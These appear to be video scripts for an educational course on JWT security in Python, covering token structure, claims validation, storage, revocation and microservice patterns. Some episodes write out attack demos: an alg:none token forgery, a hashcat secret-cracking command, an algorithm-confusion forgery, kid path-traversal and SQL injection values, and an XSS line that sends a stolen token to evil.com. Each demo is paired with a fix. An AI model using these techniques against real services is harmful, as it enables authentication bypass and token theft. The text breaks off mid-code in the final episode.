# JWT Security for Python Developers - Video Scripts

## Series Overview

| Episode | Title | Level | Duration | Key Demo |
|---------|-------|-------|----------|----------|
| E01 | JWT Structure & How Signing Works | L1 | 8 min | Decode a JWT live on jwt.io |
| E02 | The alg:none Attack | L1 | 7 min | Forge a token with no signature |
| E03 | Weak Secrets & Brute-Force | L1 | 7 min | Crack a JWT secret with hashcat |
| E04 | Claims Validation Done Right | L1 | 8 min | Exploit missing exp/aud/iss |
| E05 | Algorithm Confusion & Header Injection | L2 | 14 min | RS256-to-HS256 attack demo |
| E06 | Token Storage & Transport Security | L2 | 10 min | XSS steals localStorage token |
| E07 | Token Lifecycle & Revocation | L3 | 12 min | Build deny-list with Redis |
| E08 | Microservices JWT & Production Patterns | L3 | 14 min | Gateway + service verification |

**Total Runtime:** ~80 minutes
**Format:** Screen recording with code editor + terminal + browser
**Tools Shown:** Python 3.11+, PyJWT, Flask, Redis, jwt.io, hashcat

---

## Episode 01: JWT Structure & How Signing Works

**Duration:** 8 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Understand what a JWT is, its three parts, and how signing prevents tampering.

---

### SCENE 1: Hook (0:00 - 0:45)

**[VISUAL: Dark terminal with a JWT string scrolling across. Dramatic zoom into the dots separating the three parts.]**

**NARRATOR:**
"This string is the most common authentication token on the internet. If you're building APIs, microservices, or anything with a login — you're probably using JWTs. And if you're implementing them wrong, you might be handing attackers the keys to your entire system."

**[VISUAL: Split screen showing a legitimate token on the left, a forged token on the right with `role: admin` highlighted in red.]**

"In this series, we're going to break JWTs — then learn how to build them securely. Let's start with how they actually work."

---

### SCENE 2: The Three Parts (0:45 - 3:00)

**[VISUAL: Code editor — open a new Python file `jwt_basics.py`]**

**NARRATOR:**
"A JWT — JSON Web Token — has three parts, separated by dots. Header, payload, signature. Each is Base64URL-encoded."

**[VISUAL: Open jwt.io in browser. Paste a sample token. Highlight each colored section.]**

"The header tells you what algorithm was used to sign it. The payload contains claims — that's your user data. And the signature proves nobody tampered with either of them."

**[VISUAL: Switch to code editor. Type:]**

```python
import jwt
from datetime import datetime, timedelta, timezone

# Create a simple JWT
payload = {
    "sub": "user123",
    "role": "viewer",
    "exp": datetime.now(timezone.utc) + timedelta(hours=1),
    "iss": "myapp.example.com",
    "aud": "api.example.com"
}

token = jwt.encode(payload, "my-secret-key", algorithm="HS256")
print(token)
```

**[VISUAL: Run the script in terminal. Show the output token string.]**

"Three parts, separated by dots. Let's decode this without verifying the signature — just to see what's inside."

**[VISUAL: Add to script:]**

```python
# Peek at the payload (no verification)
import base64, json
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload_decoded = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print("Header:", json.dumps(header, indent=2))
print("Payload:", json.dumps(payload_decoded, indent=2))
```

**[VISUAL: Run it. Show header with `alg: HS256` and payload with all claims visible.]**

**NARRATOR:**
"Here's the critical thing — anyone can decode a JWT. It's not encrypted. The payload is readable by anyone who has the token. The signature only prevents tampering. It does NOT hide the contents."

**[VISUAL: Highlight this text on screen as a callout box: "JWTs are SIGNED, not ENCRYPTED. Anyone can read the payload."]**

---

### SCENE 3: Symmetric vs Asymmetric Signing (3:00 - 5:30)

**[VISUAL: Animated diagram showing HMAC flow vs RSA flow]**

**NARRATOR:**
"There are two ways to sign a JWT. Symmetric and asymmetric."

**[VISUAL: Left side — HMAC diagram]**

"With HMAC — HS256 — you use the same secret to sign and verify. Simple, but both sides need the secret. Good for a single service."

**[VISUAL: Right side — RSA diagram]**

"With RSA — RS256 — you sign with a private key and verify with the public key. The public key can't create tokens, only verify them. Perfect for microservices where many services need to verify but only one should sign."

**[VISUAL: Side-by-side comparison table]**

| | HMAC (HS256) | RSA (RS256) |
|---|---|---|
| Sign with | Shared secret | Private key |
| Verify with | Same shared secret | Public key |
| Best for | Single service | Multi-service |
| Risk | Secret must be shared | Private key must be protected |

---

### SCENE 4: What Happens When You Tamper (5:30 - 7:15)

**[VISUAL: Code editor — new script `jwt_tamper.py`]**

**NARRATOR:**
"Let's see what happens when someone tries to modify a token."

**[VISUAL: Type:]**

```python
import jwt

SECRET = "my-secret-key"
token = jwt.encode({"sub": "user123", "role": "viewer"}, SECRET, algorithm="HS256")
print("Original token:", token)

# Verify it works
payload = jwt.decode(token, SECRET, algorithms=["HS256"])
print("Verified payload:", payload)

# Now let's tamper with the payload
import base64, json
parts = token.split('.')
payload_bytes = base64.urlsafe_b64decode(parts[1] + '==')
payload_data = json.loads(payload_bytes)
payload_data["role"] = "admin"  # Escalate privileges!
new_payload = base64.urlsafe_b64encode(
    json.dumps(payload_data).encode()
).rstrip(b'=').decode()
tampered_token = f"{parts[0]}.{new_payload}.{parts[2]}"
print("Tampered token:", tampered_token)

# Try to verify the tampered token
try:
    jwt.decode(tampered_token, SECRET, algorithms=["HS256"])
    print("DANGER: Tampered token accepted!")
except jwt.InvalidSignatureError:
    print("SECURE: Tampered token rejected - signature mismatch")
```

**[VISUAL: Run it. Show "SECURE: Tampered token rejected" in green.]**

**NARRATOR:**
"The signature catches the tampering. The payload was modified, so the signature no longer matches. This is exactly how JWT security is supposed to work."

"But what if the server doesn't check the signature properly? That's where things get dangerous. And that's what we'll cover next."

---

### SCENE 5: Recap & Preview (7:15 - 8:00)

**[VISUAL: Recap slide with key points]**

**NARRATOR:**
"So remember — JWTs have three parts: header, payload, signature. They're signed, not encrypted. And the signature is the only thing preventing forgery. In the next episode, we'll see what happens when you break that signature check — the alg:none attack."

**[VISUAL: "Next: The alg:none Attack" card]**

---

## Episode 02: The alg:none Attack

**Duration:** 7 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Understand the alg:none vulnerability, demonstrate the attack, and implement the fix.

---

### SCENE 1: The Problem (0:00 - 1:30)

**[VISUAL: The JWT spec (RFC 7519) open in browser, scrolled to the "none" algorithm section.]**

**NARRATOR:**
"The JWT specification defines an algorithm called 'none.' It means: no signature. The token is completely unsigned. This exists in the spec for cases where the token has already been verified through another mechanism."

"But here's the problem — if your server accepts 'alg: none,' an attacker can craft any token they want with zero cryptographic knowledge. No secret needed. No key needed. Just raw forgery."

**[VISUAL: Red warning callout: "alg:none = No signature = Anyone can forge tokens"]**

---

### SCENE 2: The Vulnerable Code (1:30 - 3:00)

**[VISUAL: Code editor — `alg_none_vuln.py`]**

**NARRATOR:**
"Here's what vulnerable code looks like. Watch the algorithms list."

**[VISUAL: Type with the "none" in algorithms highlighted red:]**

```python
import jwt

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            "my-secret-key",
            algorithms=["HS256", "none"]  # <-- THE BUG
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

"See that algorithms list? It includes 'none.' The developer probably added it for testing and forgot to remove it. Or they thought it was harmless. It's not."

---

### SCENE 3: Live Attack Demo (3:00 - 5:00)

**[VISUAL: New file — `alg_none_attack.py`]**

**NARRATOR:**
"Let me show you the attack. I'll forge a token that makes me admin — without knowing the secret."

**[VISUAL: Type:]**

```python
import base64
import json

# Step 1: Craft a header with alg: none
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

# Step 2: Craft a payload with whatever I want
payload = base64.urlsafe_b64encode(
    json.dumps({
        "sub": "attacker",
        "role": "admin",
        "email": "attacker@evil.com"
    }).encode()
).rstrip(b"=").decode()

# Step 3: No signature needed - just an empty string after the dot
forged_token = f"{header}.{payload}."
print("Forged token:", forged_token)
```

**[VISUAL: Run it. Show the forged token output.]**

"Now let's feed this to the vulnerable verification function."

**[VISUAL: Add the vulnerable verify function and test:]**

```python
# The vulnerable server accepts this!
result = verify_token(forged_token)
print("Server accepted:", result)
# Output: {'sub': 'attacker', 'role': 'admin', 'email': 'attacker@evil.com'}
```

**[VISUAL: Run it. Show the payload accepted with role: admin highlighted in red.]**

**NARRATOR:**
"Full admin access. No secret, no key, no cryptography. Just Base64 encoding and an empty signature."

---

### SCENE 4: The Fix (5:00 - 6:15)

**[VISUAL: Code editor — fix the vulnerable code]**

**NARRATOR:**
"The fix is simple but critical."

**[VISUAL: Edit the algorithms list, highlighting the change:]**

```python
import jwt

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            "my-secret-key",
            algorithms=["HS256"]  # ONLY accept HS256 - never "none"
        )
        return payload
    except jwt.InvalidTokenError:
        return None
```

"One change: remove 'none' from the algorithms list. In fact, never have more than one algorithm unless you specifically need key rotation support."

**[VISUAL: Test the forged token against the fixed function. Show rejection.]**

"Good news: PyJWT version 2.4 and later rejects 'alg: none' by default, even if you accidentally include it. But always be explicit. Don't rely on library defaults — they can change."

---

### SCENE 5: Rules to Remember (6:15 - 7:00)

**[VISUAL: Slide with rules]**

**NARRATOR:**

"Three rules from this episode:

One — Always use an explicit algorithms list with only the algorithms you actually use.

Two — Never include 'none' in that list. Ever.

Three — Treat the algorithms parameter as a strict allowlist. One algorithm per use case.

Next up: what happens when your secret is too weak."

**[VISUAL: "Next: Weak Secrets & Brute-Force" card]**

---

## Episode 03: Weak Secrets & Brute-Force

**Duration:** 7 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Understand why weak JWT secrets are dangerous and how to generate strong ones.

---

### SCENE 1: The Problem (0:00 - 1:30)

**[VISUAL: Terminal showing hashcat running against a JWT. The word "password123" appearing as the cracked secret.]**

**NARRATOR:**
"HMAC-based JWTs use a shared secret. If that secret is weak — short, dictionary-based, or predictable — an attacker can brute-force it offline. No server interaction needed. No rate limiting possible. They download one token and crack it on their own hardware."

**[VISUAL: List of common weak secrets scrolling across screen:]**

```
secret
password
password123
changeme
mysecretkey
your-256-bit-secret  (from jwt.io!)
```

"These are real secrets found in production systems. Every single one can be cracked in seconds."

---

### SCENE 2: The Vulnerable Code (1:30 - 2:30)

**[VISUAL: Code editor — `weak_secret.py`]**

```python
import jwt
from datetime import datetime, timedelta, timezone

SECRET = "password123"  # This is the entire problem

def create_token(user_id, role):
    payload = {
        "sub": user_id,
        "role": role,
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")
```

**NARRATOR:**
"The code structure is fine. The algorithm is fine. But the secret `password123` means everything built on top of it is breakable."

---

### SCENE 3: Brute-Force Demo (2:30 - 4:30)

**[VISUAL: Terminal — hashcat demo]**

**NARRATOR:**
"Let me show you how fast this breaks. I'll generate a token with a weak secret and crack it."

**[VISUAL: Generate a token, save to file, run hashcat:]**

```bash
# Generate a JWT signed with "password123"
python3 -c "
import jwt
token = jwt.encode({'sub':'user','role':'admin'}, 'password123', algorithm='HS256')
print(token)
" > jwt_token.txt

# Crack it with hashcat (mode 16500 = JWT)
hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```

**[VISUAL: Show hashcat output with "password123" found. Highlight the time — seconds.]**

"Found in under a second. Now the attacker has the secret. They can forge any token — any user, any role, any permissions."

**[VISUAL: Show attacker forging a token with the cracked secret:]**

```python
import jwt
forged = jwt.encode(
    {"sub": "admin", "role": "superadmin"},
    "password123",  # cracked!
    algorithm="HS256"
)
```

---

### SCENE 4: The Fix (4:30 - 6:00)

**[VISUAL: Code editor — `strong_secret.py`]**

**NARRATOR:**
"The fix is straightforward. Use a cryptographically random secret with enough entropy."

```python
import jwt
import secrets
from datetime import datetime, timedelta, timezone

# 256-bit cryptographically random secret
SECRET = secrets.token_hex(32)  # 64 hex chars = 256 bits

# In production, load from environment:
# SECRET = os.environ["JWT_SECRET"]
```

**[VISUAL: Show the strength comparison table:]**

| Secret | Entropy | Time to Crack |
|--------|---------|---------------|
| `"secret"` | ~30 bits | Seconds |
| `"MyApp2024!"` | ~50 bits | Hours |
| `secrets.token_hex(32)` | 256 bits | Longer than the universe |

**NARRATOR:**
"256 bits of randomness. That's the standard. And for even better security — use asymmetric keys. RS256 with a 2048-bit RSA key. No shared secret to leak or crack."

"And critically — never hardcode secrets in source code. Load them from environment variables or a secrets manager."

---

### SCENE 5: Key Takeaways (6:00 - 7:00)

**[VISUAL: Rules slide]**

**NARRATOR:**
"Three rules:

One — `secrets.token_hex(32)` minimum for HMAC secrets. 256 bits of randomness.

Two — Load secrets from environment variables or a secrets manager. Never in code, never in git.

Three — Consider RS256 or ES256 instead. No shared secret means no brute-force risk.

Next: what happens when you forget to validate the claims inside the token."

---

## Episode 04: Claims Validation Done Right

**Duration:** 8 minutes
**Level:** L1 - Fundamentals
**Learning Objective:** Validate exp, aud, iss, and other critical claims to prevent token misuse.

---

### SCENE 1: Tokens That Live Forever (0:00 - 2:00)

**[VISUAL: Code editor — `no_expiry.py`]**

**NARRATOR:**
"You've signed your token correctly. Strong secret. Good algorithm. But there's a claim missing that turns your secure token into a ticking time bomb."

```python
import jwt

def create_token(user_id):
    payload = {
        "sub": user_id,
        "role": "user"
        # No "exp" claim - this token NEVER expires
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")
```

"No expiration. This token is valid forever. If it leaks in a log file, browser history, or a database dump three years from now — it still works."

**[VISUAL: Timeline showing: Token created → 6 months pass → Token found in old backup → Still valid → Account compromised]**

"Even worse — some developers explicitly disable expiry checking."

```python
def verify_token(token):
    return jwt.decode(
        token, SECRET, algorithms=["HS256"],
        options={"verify_exp": False}  # WHY?!
    )
```

---

### SCENE 2: Cross-Service Token Confusion (2:00 - 4:00)

**[VISUAL: Architecture diagram showing Service A and Service B]**

**NARRATOR:**
"Here's another dangerous pattern. No audience or issuer validation."

```python
# Service A verifies tokens but doesn't check WHO the token is for
def verify_token(token):
    return jwt.decode(token, SECRET, algorithms=["HS256"])
    # No audience check! No issuer check!
```

"If Service A and Service B share a secret — or if a user gets a token for Service A — they can use it on Service B. Different permissions, different data, same token."

**[VISUAL: Arrow showing token moving from Service A to Service B with a red warning icon]**

"This is called token confusion. And it's entirely preventable."

---

### SCENE 3: The Correct Way (4:00 - 6:30)

**[VISUAL: Code editor — `claims_validation.py`]**

**NARRATOR:**
"Here's what complete claims validation looks like."

```python
import jwt
import secrets
from datetime import datetime, timedelta, timezone

def create_token(user_id, role):
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "role": role,
        "exp": now + timedelta(hours=1),      # Expires in 1 hour
        "iat": now,                             # When it was issued
        "nbf": now,                             # Not valid before now
        "iss": "auth.myapp.com",                # Who issued this
        "aud": "api.myapp.com",                 # Who should accept it
        "jti": secrets.token_hex(16)            # Unique ID for revocation
    }
    return jwt.encode(payload, SECRET, algorithm="HS256")

def verify_token(token):
    try:
        payload = jwt.decode(
            token,
            SECRET,
            algorithms=["HS256"],
            audience="api.myapp.com",
            issuer="auth.myapp.com",
            options={"require": ["exp", "iss", "aud", "sub"]}
        )
        return payload
    except jwt.ExpiredSignatureError:
        raise AuthError("Token has expired")
    except jwt.InvalidAudienceError:
        raise AuthError("Token audience mismatch")
    except jwt.InvalidIssuerError:
        raise AuthError("Token issuer mismatch")
    except jwt.InvalidTokenError as e:
        raise AuthError(f"Invalid token: {e}")
```

**[VISUAL: Highlight each claim with an annotation explaining its purpose]**

**NARRATOR:**
"Let me walk through each claim."

"**exp** — expiration. One hour for access tokens. This is your primary defense against stolen tokens."

"**iat** — issued at. Lets you detect old tokens and enforce a maximum age."

"**nbf** — not before. Prevents tokens from being used before they're supposed to be active."

"**iss** — issuer. Only accept tokens from your auth service."

"**aud** — audience. Only accept tokens meant for THIS service."

"**jti** — JWT ID. A unique identifier so you can revoke specific tokens."

"And the `options.require` list ensures all these claims must be present. If any is missing, the token is rejected."

---

### SCENE 4: Testing It (6:30 - 7:30)

**[VISUAL: Terminal — run test cases]**

**NARRATOR:**
"Let's verify each check works."

```python
# Test 1: Expired token
import time
token = create_token("user1", "viewer")
time.sleep(2)
# Manually create with 1-second expiry for demo
expired_token = jwt.encode(
    {"sub": "user1", "exp": datetime.now(timezone.utc) - timedelta(seconds=1)},
    SECRET, algorithm="HS256"
)
verify_token(expired_token)  # -> ExpiredSignatureError

# Test 2: Wrong audience
wrong_aud_token = jwt.encode(
    {"sub": "user1", "exp": datetime.now(timezone.utc) + timedelta(hours=1),
     "iss": "auth.myapp.com", "aud": "other-service.com"},
    SECRET, algorithm="HS256"
)
verify_token(wrong_aud_token)  # -> InvalidAudienceError

# Test 3: Missing required claim
no_sub_token = jwt.encode(
    {"exp": datetime.now(timezone.utc) + timedelta(hours=1)},
    SECRET, algorithm="HS256"
)
verify_token(no_sub_token)  # -> MissingRequiredClaimError
```

**[VISUAL: Run each test, showing the specific error for each case.]**

---

### SCENE 5: Recap (7:30 - 8:00)

**[VISUAL: Claims reference card]**

**NARRATOR:**
"Every JWT you issue should have: exp, iat, iss, aud, sub, and jti. Every verification should check all of them. That's Level 1 complete."

"In Level 2, we'll get into the advanced attacks — algorithm confusion, key ID injection, and JWK header manipulation."

---

## Episode 05: Algorithm Confusion & Header Injection

**Duration:** 14 minutes
**Level:** L2 - Advanced
**Learning Objective:** Understand algorithm confusion (RS256 to HS256), kid injection, and JWK/JKU attacks.

---

### SCENE 1: Algorithm Confusion Attack (0:00 - 5:00)

**[VISUAL: Diagram showing normal RS256 flow]**

**NARRATOR:**
"This is the most elegant JWT attack. It exploits a subtle confusion between how asymmetric and symmetric algorithms use keys."

"Normally with RS256, you sign with a private key and verify with the public key. The public key is... public. Anyone can have it. It can only verify, not sign."

**[VISUAL: Transition to attack diagram]**

"But what if you take that public key — which everyone has — and use it as an HMAC secret? HMAC doesn't know it's a public key. It just sees bytes. And if the server also accepts HS256, it will use that same public key for HMAC verification."

**[VISUAL: Code editor — vulnerable code]**

```python
# VULNERABLE: Accepts both RSA and HMAC
def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256", "HS256"]  # DANGER: mixed algorithms!
    )
```

**NARRATOR:**
"The attacker downloads the public key, signs a forged token with HS256 using the public key as the HMAC secret, and the server accepts it."

**[VISUAL: Attack demo code]**

```python
# Attacker's code
public_key_bytes = open("public_key.pem", "rb").read()
forged_token = jwt.encode(
    {"sub": "attacker", "role": "admin"},
    public_key_bytes,       # Public key as HMAC secret!
    algorithm="HS256"       # Switch to HMAC
)
# Server verifies with PUBLIC_KEY using HMAC -> passes!
```

**[VISUAL: Run the attack. Show it succeeds.]**

**NARRATOR:**
"The fix is absolute: never mix symmetric and asymmetric algorithms."

```python
# SECURE: Only accept the algorithm you use
def verify_token(token):
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256"]  # ONLY RS256. Never mix.
    )
```

---

### SCENE 2: Key ID (kid) Injection (5:00 - 9:30)

**[VISUAL: JWT header with kid field highlighted]**

**NARRATOR:**
"The JWT header can include a 'kid' field — Key ID. It tells the server which key to use. But kid is attacker-controlled input. If the server uses it unsafely, you get injection attacks."

**[VISUAL: Code editor — path traversal via kid]**

```python
# VULNERABLE: kid used directly in file path
def get_key(kid):
    key_path = f"/app/keys/{kid}.pem"  # Attacker controls kid!
    with open(key_path) as f:
        return f.read()
```

**NARRATOR:**
"Attacker sets kid to `../../../dev/null`. That's an empty file. The key becomes an empty string. They sign with an empty secret — and it matches."

"Or worse — kid as SQL injection:"

```python
# VULNERABLE: kid in SQL query
result = conn.execute(
    f"SELECT key_value FROM keys WHERE kid = '{kid}'"  # SQLi!
)
```

"Attacker sets kid to: `' UNION SELECT 'my-secret' --`"

**[VISUAL: The fix]**

```python
# SECURE: Validate kid against an allowlist
VALID_KEYS = {
    "key-2024-primary": "actual-secret-primary",
    "key-2024-secondary": "actual-secret-secondary",
}

def verify_token(token):
    header = jwt.get_unverified_header(token)
    kid = header.get("kid")

    if not kid or not re.match(r'^[a-zA-Z0-9\-]+$', kid):
        raise AuthError("Invalid key ID format")

    key = VALID_KEYS.get(kid)
    if not key:
        raise AuthError(f"Unknown key ID: {kid}")

    return jwt.decode(token, key, algorithms=["HS256"])
```

---

### SCENE 3: JWK/JKU Header Injection (9:30 - 13:00)

**[VISUAL: JWT header with jwk and jku fields]**

**NARRATOR:**
"Two more dangerous headers: jwk embeds a public key directly in the token. jku provides a URL to fetch keys from. If the server trusts either, the attacker controls the verification key."

**[VISUAL: Attack diagram — attacker's key server]**

```python
# VULNERABLE: Trust the key from the token header
if "jwk" in header:
    key = header["jwk"]  # Attacker supplies their own key!
    return jwt.decode(token, key, algorithms=["RS256"])

# VULNERABLE: Fetch keys from URL in the token
if "jku" in header:
    jwks = requests.get(header["jku"]).json()  # Attacker's URL!
    key = jwks["keys"][0]
    return jwt.decode(token, key, algorithms=["RS256"])
```

**NARRATOR:**
"The attacker generates their own key pair, puts their public key in the jwk header, signs with their private key. The server uses the attacker's key to verify the attacker's token. Of course it passes."

"The fix: never trust the token to tell you how to verify itself."

```python
# SECURE: Pre-configured JWKS URL only
JWKS_URL = "https://auth.myapp.com/.well-known/jwks.json"

def verify_token(token):
    header = jwt.get_unverified_header(token)

    # REJECT embedded keys
    if "jwk" in header or "jku" in header:
        raise AuthError("Embedded keys not accepted")

    # Use only pre-configured, trusted keys
    kid = header.get("kid")
    keys = get_signing_keys_from_trusted_url()
    ...
```

---

### SCENE 4: Level 2 Summary (13:00 - 14:00)

**[VISUAL: Summary card with the three attacks]**

**NARRATOR:**
"Three header-based attacks, one rule: the token should never tell you how to verify itself.

One — Algorithm from configuration, never from the token header.
Two — kid validated against an allowlist, never used in paths or queries.
Three — jwk and jku from the token are rejected entirely.

Next: token storage and transport."

---

## Episode 06: Token Storage & Transport Security

**Duration:** 10 minutes
**Level:** L2 - Advanced
**Learning Objective:** Secure token storage (HttpOnly cookies vs localStorage) and transport patterns.

---

### SCENE 1: The localStorage Trap (0:00 - 3:30)

**[VISUAL: Browser dev tools showing localStorage with a JWT]**

**NARRATOR:**
"This is the most common JWT storage mistake. Storing tokens in localStorage."

```javascript
// Frontend code — VULNERABLE
localStorage.setItem("token", response.access_token);
```

"The problem? Any JavaScript on the page can read localStorage. If your application has a single XSS vulnerability — one unsanitized input, one third-party script compromise — the attacker runs:"

```javascript
// Attacker's XSS payload
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))
```

**[VISUAL: Demo — simple XSS stealing a token from localStorage]**

**NARRATOR:**
"Token stolen. Full account takeover. And unlike session cookies, there's no built-in protection."

---

### SCENE 2: HttpOnly Cookies (3:30 - 7:00)

**[VISUAL: Code editor — Flask secure cookie implementation]**

**NARRATOR:**
"The secure approach: HttpOnly cookies."

```python
from flask import Flask, make_response, request, jsonify

@app.route("/api/login", methods=["POST"])
def login():
    user = authenticate(request.json["username"], request.json["password"])
    if not user:
        return jsonify({"error": "invalid credentials"}), 401

    access_token = create_token(user.id)

    response = make_response(jsonify({"message": "logged in"}))
    response.set_cookie(
        "access_token",
        access_token,
        httponly=True,      # JavaScript CAN'T read this
        secure=True,        # HTTPS only
        samesite="Strict",  # CSRF protection
        max_age=3600,       # 1 hour
        path="/api"         # Only sent to API routes
    )
    return response
```

"HttpOnly means JavaScript cannot access this cookie. XSS can't steal it. Secure means HTTPS only. SameSite prevents CSRF. This is the recommended pattern for web applications."

**[VISUAL: Comparison table]**

| Storage | XSS Safe | CSRF Safe | Recommended |
|---------|----------|-----------|-------------|
| localStorage | No | Yes | No |
| sessionStorage | No | Yes | No |
| HttpOnly Cookie | Yes | With SameSite | Yes |
| Memory only | Yes (if no XSS) | Yes | SPAs only |

---

### SCENE 3: Never Tokens in URLs (7:00 - 8:30)

**[VISUAL: Browser address bar with a token in the query string]**

**NARRATOR:**
"One more anti-pattern: tokens in URLs."

```python
# VULNERABLE: Token in query string
@app.route("/api/data")
def get_data():
    token = request.args.get("token")  # In the URL!
```

"URL tokens appear in browser history, server access logs, referrer headers when you click a link, proxy logs, and monitoring dashboards. That's at least five places your authentication token shouldn't be."

"Always use the Authorization header or cookies. Never query strings."

---

### SCENE 4: Recap (8:30 - 10:00)

**[VISUAL: Storage decision flowchart]**

**NARRATOR:**
"Decision tree for token storage:

Web application with a backend? HttpOnly cookie with Secure, SameSite=Strict.

Single-page app? Store in memory. Accept re-authentication on page refresh.

Mobile app? Secure platform storage — Keychain on iOS, EncryptedSharedPreferences on Android.

Never localStorage. Never URLs. Never in code."

---

## Episode 07: Token Lifecycle & Revocation

**Duration:** 12 minutes
**Level:** L3 - Architecture
**Learning Objective:** Design a complete token lifecycle with access/refresh tokens and deny-list revocation.

---

### SCENE 1: The Revocation Problem (0:00 - 2:30)

**[VISUAL: Diagram showing a user logging out but their JWT still works]**

**NARRATOR:**
"JWTs are stateless. The server doesn't track issued tokens. So when a user logs out, changes their password, or their account gets compromised — how do you invalidate the token? You can't delete it from the server because the server never stored it."

"This is the fundamental tension of JWT design: statelessness makes them scalable but makes revocation hard."

---

### SCENE 2: Access + Refresh Pattern (2:30 - 6:00)

**[VISUAL: Code editor — `token_lifecycle.py`]**

**NARRATOR:**
"The solution is a two-token pattern. Short-lived access tokens plus longer-lived refresh tokens."

```python
ACCESS_TOKEN_TTL = timedelta(minutes=15)    # Very short
REFRESH_TOKEN_TTL = timedelta(days=7)       # Longer, but revocable

SECRET = os.environ["JWT_SECRET"]
REFRESH_SECRET = os.environ["JWT_REFRESH_SECRET"]  # DIFFERENT secret!

def issue_token_pair(user_id, role):
    now = datetime.now(timezone.utc)
    jti = secrets.token_hex(16)

    access_token = jwt.encode({
        "sub": user_id, "role": role,
        "exp": now + ACCESS_TOKEN_TTL,
        "iss": "auth.myapp.com", "aud": "api.myapp.com",
        "type": "access", "jti": jti
    }, SECRET, algorithm="HS256")

    refresh_token = jwt.encode({
        "sub": user_id,
        "exp": now + REFRESH_TOKEN_TTL,
        "iss": "auth.myapp.com", "aud": "auth.myapp.com",  # Different audience!
        "type": "refresh", "jti": secrets.token_hex(16)
    }, REFRESH_SECRET, algorithm="HS256")  # Different secret!

    return access_token, refresh_token
```

**[VISUAL: Highlight three critical differences between access and refresh tokens]**

**NARRATOR:**
"Three separations: different TTLs, different secrets, different audiences. A refresh token can't be used as an access token and vice versa."

---

### SCENE 3: Redis Deny-List (6:00 - 9:30)

**[VISUAL: Terminal showing Redis commands alongside Python code]**

**NARRATOR:**
"For revocation, we use a deny-list in Redis. When a token is revoked, we store its JTI with a TTL matching the token's remaining lifetime."

```python
import redis
redis_client = redis.Redis(host="localhost", port=6379, db=0)

def verify_access_token(token):
    payload = jwt.decode(token, SECRET, algorithms=["HS256"],
        audience="api.myapp.com", issuer="auth.myapp.com")

    if payload.get("type") != "access":
        raise AuthError("Not an access token")

    # Check deny-list
    if redis_client.exists(f"revoked:{payload['jti']}"):
        raise AuthError("Token has been revoked")

    return payload

def revoke_token(jti, ttl):
    redis_client.setex(f"revoked:{jti}", int(ttl.total_seconds()), "1")

def logout(access_token, refresh_token):
    # Revoke both tokens
    try:
        payload = jwt.decode(access_token, SECRET, algorithms=["HS256"],
            audience="api.myapp.com", issuer="auth.myapp.com")
        revoke_token(payload["jti"], ACCESS_TOKEN_TTL)
    except jwt.InvalidTokenError:
        pass  # Already expired, fine

    try:
        payload = jwt.decode(refresh_token, REFRESH_SECRET, algorithms=["HS256"],
            audience="auth.myapp.com", issuer="auth.myapp.com")
        revoke_token(payload["jti"], REFRESH_TOKEN_TTL)
    except jwt.InvalidTokenError:
        pass
```

**[VISUAL: Show Redis CLI with `KEYS revoked:*` showing the deny-list entries, and `TTL revoked:abc123` showing auto-cleanup]**

**NARRATOR:**
"The beauty of this approach: Redis entries auto-expire with the TTL. The deny-list is self-cleaning. No garbage collection needed."

---

### SCENE 4: Password Change Revocation (9:30 - 11:00)

**[VISUAL: Code showing user-level revocation]**

**NARRATOR:**
"What about password changes? You can't revoke every individual token. Instead, store a 'revoked before' timestamp for the user."

```python
def on_password_change(user_id):
    redis_client.set(
        f"user_revoked_before:{user_id}",
        datetime.now(timezone.utc).isoformat()
    )

# During verification, check if the token was issued before revocation
def verify_access_token(token):
    payload = jwt.decode(...)
    revoked_before = redis_client.get(f"user_revoked_before:{payload['sub']}")
    if revoked_before:
        token_issued = datetime.fromtimestamp(payload["iat"], tz=timezone.utc)
        if token_issued < datetime.fromisoformat(revoked_before.decode()):
            raise AuthError("Token issued before credential change")
    return payload
```

"Any token issued before the password change is automatically rejected. Clean and efficient."

---

### SCENE 5: Lifecycle Diagram (11:00 - 12:00)

**[VISUAL: Animated lifecycle diagram]**

**NARRATOR:**
"The complete lifecycle: Login issues a pair. The access token is used for API calls — 15 minutes. When it expires, the refresh token gets a new pair. On logout or password change, both tokens are revoked via the deny-list. Redis auto-cleans expired entries."

"This is the pattern used by every serious authentication system."

---

## Episode 08: Microservices JWT & Production Patterns

**Duration:** 14 minutes
**Level:** L3 - Architecture
**Learning Objective:** Architect JWT security for microservices with a gateway pattern and build a production-ready JWT service.

---

### SCENE 1: The Gateway Pattern (0:00 - 4:00)

**[VISUAL: Architecture diagram — API Gateway with microservices behind it]**

**NARRATOR:**
"In a microservice architecture, JWTs solve a fundamental problem: how do services verify authentication without a shared database?"

"The pattern is: one gateway signs, every service verifies."

**[VISUAL: Animate the flow]**

"The API gateway holds the private key and issues JWTs. Internal services only have the public key — they can verify but never forge. Each service has its own audience. A token for the orders service won't work on the billing service."

**[VISUAL: Code editor — service-level verification]**

```python
SERVICE_AUDIENCE = "orders-service.internal"
GATEWAY_PUBLIC_KEY = load_public_key("/etc/keys/gateway-public.pem")

def require_auth(required_scopes=None):
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            token = request.headers.get("Authorization", "").removeprefix("Bearer ")
            payload = jwt.decode(
                token,
                GATEWAY_PUBLIC_KEY,
                algorithms=["RS256"],
                audience=SERVICE_AUDIENCE,   # MY audience only
                issuer="gateway.myapp.com",
                options={"require": ["exp", "sub", "scope"]}
            )

            # Check scopes
            if required_scopes:
                token_scopes = set(payload.get("scope", "").split())
